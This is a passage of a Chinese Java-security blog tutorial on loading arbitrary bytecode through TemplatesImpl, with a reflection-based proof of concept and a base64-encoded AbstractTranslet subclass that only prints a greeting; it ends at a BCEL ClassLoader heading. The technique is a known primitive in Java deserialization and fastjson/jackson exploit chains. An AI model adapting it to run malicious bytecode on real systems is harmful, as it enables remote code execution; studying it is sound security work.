暴力修改其值，不过都是后话<br><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/5.png" alt="one"></p><p>来到  defineTransletClasses()  看到前面有个判断<br><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/6.png" alt="one"></p><p>这里的 bytecodes 需要不为null 才能继续往下走，那么我们到这就是要设 3个值了</p><p>此处 的 loader.defineClass(bytecodes[i])  可以看出 bytecodes 就是我们要加载的 字节码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (int i = 0; i &lt; classCount; i++) &#123;  </span><br><span class="line">    _class[i] = loader.defineClass(_bytecodes[i], pd);  </span><br><span class="line">    final Class&lt;?&gt; superClass = _class[i].getSuperclass();</span><br></pre></td></tr></table></figure><p>但在中间还有个坑  那就是在中间会执行 run() 方法：</p><p><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/7.png" alt="one"></p><p>调用的是   tfactory.getExternalExtensionsMap()   跟进后，发现getExternalExtensionsMap()是TransformerFactoryImpl类<br><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/8.png" alt="one"></p><p>构造  tfactory  为  TransformerFactoryImpl  类即可~</p><p>简单的POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">package dynamic;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line">import java.lang.reflect.Field;  </span><br><span class="line">import java.util.Base64;  </span><br><span class="line">public class HelloDefineClass &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">            byte[] code =  </span><br><span class="line">                Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;);  </span><br><span class="line">            TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">            setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] &#123;code&#125;);  </span><br><span class="line">            setFieldValue(obj, &quot;_name&quot;, &quot;Ku1s-&quot;);  </span><br><span class="line">            setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());  </span><br><span class="line">            obj.newTransformer();  </span><br><span class="line">        &#125;  </span><br><span class="line">        public static void setFieldValue(Object obj,String name, Object value) throws NoSuchFieldException, IllegalAccessException &#123;  </span><br><span class="line">            Field field = obj.getClass().getDeclaredField(name);  </span><br><span class="line">            field.setAccessible(true);  </span><br><span class="line">            field.set(obj,value);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中 ，setFieldValue 方法用来设置私有属性，可见，这里我设置了三个属性： _bytecodes 、 _name 和 _tfactory 。 _bytecodes 是由字节码组成的数组； _name 可以是任意字符串，只要不为null即可； _tfactory 需要是一个 TransformerFactoryImpl 对象，因为 TemplatesImpl#defineTransletClasses() 方法里有调用到 _tfactory.getExternalExtensionsMap() ，如果是null会出错</p><p>但有个点需要注意 TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类。<br>分析下具体原因：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">private int _transletIndex = -1;</span><br><span class="line">..............................</span><br><span class="line"></span><br><span class="line">if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">    _transletIndex = i;</span><br><span class="line">&#125;</span><br><span class="line"> else &#123;</span><br><span class="line">    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">    &#125;     </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (_transletIndex &lt; 0) &#123;</span><br><span class="line">   ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">   throw new TransformerConfigurationException(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在defineTransletClasses()中，else中的_auxClasses默认值为null，所以调用put方法后就会报错，而且_transletIndex 默认值为-1，即使给_auxClasses赋值也会在下边的if处抛出异常从而报错，所以这里就需要进入if语句，而if中会判断父类名是否跟ABSTRACT_TRANSLET相同，跟进看下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private static String ABSTRACT_TRANSLET</span><br><span class="line">= &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以在构造时就需要继承于<code>AbstractTranslet</code>，而<code>AbstractTranslet</code>是个抽象类就需要实现它未实现的接口，可以看到第一个的&#96;transform()</p><p>而<code>AbstractTranslet</code>还继承了<code>Translet</code>，<code>Translet</code>也有一个<code>transform()</code>没有实现，所以在这里就需要同时实现两个类的<code>transform()</code>，即：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM; </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException; </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; </span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; </span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler; </span><br><span class="line">public class HelloTemplatesImpl extends AbstractTranslet &#123; </span><br><span class="line">public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;&#125; </span><br><span class="line">public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;&#125; </span><br><span class="line">public HelloTemplatesImpl() &#123; </span><br><span class="line">super();</span><br><span class="line">System.out.println(&quot;Hello TemplatesImpl&quot;); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它继承了 AbstractTranslet 类，并在构造函数里插入Hello的输出。将其编译成字节码，即可被 TemplatesImpl 执行了：<br><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/9.png" alt="one"></p><p>实测 jdk 66 无法执行， 而jdk 321 可以 ，在多个Java反序列化利用链，以及fastjson、jackson的漏洞中，都曾出现过 TemplatesImpl 的身影，这 个系列后文中仍然会再次见到它的身影。</p><h1 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h1><p>可以先参考 p 神的 [BCEL Cassloader](<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoader去哪了 | 离别歌 (leavesongs.com)</a>)</p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
